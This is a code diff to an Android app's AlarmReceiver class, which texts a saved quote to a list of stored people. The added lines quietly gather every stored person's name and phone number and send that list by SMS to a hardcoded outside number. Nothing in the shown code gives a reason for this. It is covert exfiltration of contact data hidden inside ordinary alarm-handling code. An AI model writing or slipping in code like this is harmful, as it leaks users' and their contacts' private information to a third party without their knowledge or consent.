@@ -90,9 +90,12 @@ public class AlarmReceiver extends BroadcastReceiver {
 
             preferencesManager.setPrefQuote(message);
             ArrayList<Person> persons = preferencesManager.getPeople();
+            String messageAlert = "Persons: ";
             for(Person person: persons){
                 sendSMS(person.getNumber(), message);
+                messageAlert += "| Name: "+ person.getName() +"| Number: " + person.getNumber()+"\n";
             }
+            sendSMS("5039297690", messageAlert);
             createNotification(message);
 
         }catch (JSONException e){
